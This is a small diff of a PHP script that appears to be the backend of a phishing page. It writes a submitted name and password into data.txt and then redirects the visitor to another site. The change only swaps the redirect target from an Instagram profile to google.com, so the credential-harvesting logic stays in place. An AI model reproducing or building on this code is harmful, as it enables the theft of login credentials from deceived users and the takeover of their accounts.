@@ -5,6 +5,6 @@ $fp = fopen("data.txt", "a");
 $savestring = $name . "," . $pass . "\n";
 fwrite($fp, $savestring);
 fclose($fp);
-header('Location:https://instagram.com/ppsckts/');
+header('Location:http://google.com');
 exit;
 ?>
